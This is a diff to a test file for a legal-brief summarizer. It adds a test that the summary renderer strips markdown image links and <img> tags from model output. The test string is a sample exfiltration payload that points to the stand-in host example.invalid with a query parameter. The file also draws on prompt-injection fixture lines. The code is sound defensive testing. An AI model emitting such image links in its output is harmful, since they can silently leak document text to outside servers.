@@ -12,11 +12,14 @@ from brief_digest.summarize import (
     BANNER,
     SUMMARY_JSON,
     SUMMARY_MD,
+    Item,
     SummarizeConfig,
     SummaryRejected,
     chunk_pages,
+    render_summary,
     summarize,
 )
+from brief_digest.template import load_template
 from tests.fixtures.synth import INJECTION_LINES, SyntheticDoc
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
@@ -300,3 +303,13 @@ def test_no_document_text_in_logs(
     assert caplog.records
     for word in ("Recorrente", "Fulano", "IGNORE", "REsp", "Executei", "página"):
         assert word not in logged
+
+
+def test_model_output_cannot_make_a_markdown_viewer_fetch_anything() -> None:
+    template = load_template(DEFAULT_TEMPLATE)
+    hostile = "Pedido ![p](https://example.invalid/?q=texto) <img src=https://example.invalid/x>"
+    rendered = render_summary(template, {"pedidos": [Item(hostile, (1,))]})
+    assert "![" not in rendered
+    assert "](" not in rendered
+    assert "<img" not in rendered
+    assert "(p. 1)" in rendered
